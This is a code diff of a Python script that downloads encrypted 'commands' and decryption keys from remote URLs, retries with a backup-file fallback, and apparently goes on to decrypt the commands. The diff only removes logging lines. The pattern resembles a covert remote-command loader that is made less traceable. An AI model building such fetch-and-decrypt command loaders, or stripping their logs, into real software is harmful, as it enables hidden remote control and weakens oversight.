@@ -80,7 +80,6 @@ async def download_keys(COMMAND_SITE_KEY):
     async with ClientSession() as session:
         async with session.get(COMMAND_SITE_KEY, headers=headers) as response:
             if response.status == 200:
-                log(f"Successfully downloaded {len(await response.text())} bytes of keys")
                 return await response.text()  # Read text-based key
             else:
                 raise RuntimeError(f"Failed to download keys: {response.status}")
@@ -134,17 +133,13 @@ async def main():
 
     if ".gguf" in filename:
         trys = 16
-        log(f"Trying to download - {backup_file_url}")
     else:
         trys = 0
-        log(f"Trying to download - {encrypted_file_url} with the key of {key_url}")
 
     # Download commands and keys
     while trys < 18:
         try:
-            log(f"Try number: {trys}")
             if trys > 15:
-                log("Trying to download normal file")
                 backup_commands = download_commands_new(backup_file_url)
 
                 with open(filename, "wb") as f:
@@ -154,15 +149,12 @@ async def main():
                 break
 
             if trys > 5:
-                log("Trying to download encrypted file")
                 encrypted_commands = await download_commands(encrypted_file_url)
             else:
-                log("Trying to download encrypted file (new method)")
                 encrypted_commands = download_commands_new(encrypted_file_url)
 
             log("Encrypted file downloaded successfully")
             keys = await download_keys(key_url)
-            log("Keys downloaded successfully")
             time.sleep(1)
 
             # Decrypt commands
